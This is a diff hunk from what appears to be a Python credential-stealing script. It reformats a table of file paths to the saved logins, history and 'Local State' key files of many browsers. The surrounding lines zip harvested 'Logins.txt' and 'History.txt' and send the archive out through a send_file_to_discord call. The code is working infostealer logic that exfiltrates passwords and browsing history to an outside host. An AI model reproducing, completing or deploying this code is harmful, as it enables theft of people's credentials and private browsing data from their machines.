@@ -141,72 +141,20 @@ def zip_files():
         zipf.write("Logins.txt")
         zipf.write("History.txt")
 browser_paths = {
-    "Chrome": {
-        "history": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")
+    "Chrome": {"history": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Local State")},
+    "Edge": {"history": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")},
+    "Brave": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")},
+    "Firefox": {"history": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"), "login_data": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default-release\\LoginData"), "local_state": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default-release\\Local State")},
+    "Opera": {"history": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\History"), "login_data": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State")},
+    "Vivaldi": {"history": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Local State")},
+    "Yandex": {"history": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State")},
+    "Opera GX": {"history": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Local State")},
+    "Brave": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")},
+    "Avast": {"history": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Local State")},
+    "Brave Nightly": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Local State")},
+    "Brave Beta": {"history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Local State")},
+    "Chromium": {"history": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Default\\History"), "login_data": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Default\\Login Data"), "local_state": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Local State")}
     },
-    "Edge": {
-        "history": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State")
-    },
-    "Brave": {
-        "history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")
-    },
-    "Firefox": {
-        "history": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"),
-        "login_data": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default-release\\LoginData"),
-        "local_state": os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default-release\\Local State"),
-    },
-   "Opera": {
-        "history": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State")
-    },
-    "Vivaldi": {
-        "history": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\Vivaldi\\User Data\\Local State")
-    },
-    "Yandex": {
-        "history": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Local State"),
-    },
-    "Opera GX": {
-        "history": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\Programs\\Opera GX\\User Data\\Local State"),
-    },
-    "Brave": {
-        "history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State")
-    },
-    "Avast": {
-        "history": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\Avast Software\\Avast\\User Data\\Local State")
-    },
-    "Brave Nightly": {
-        "history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Nightly\\User Data\\Local State")
-    },
-    "Brave Beta": {
-        "history": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser Beta\\User Data\\Local State")
-    },
-    "Chromium": {
-        "history": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Default\\History"),
-        "login_data": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Default\\Login Data"),
-        "local_state": os.path.expanduser("~\\AppData\\Local\\Chromium\\User Data\\Local State")
-    }                                         
-}
 fetch_browser_history(browser_paths)
 zip_files()
 send_file_to_discord("Browsers.zip")
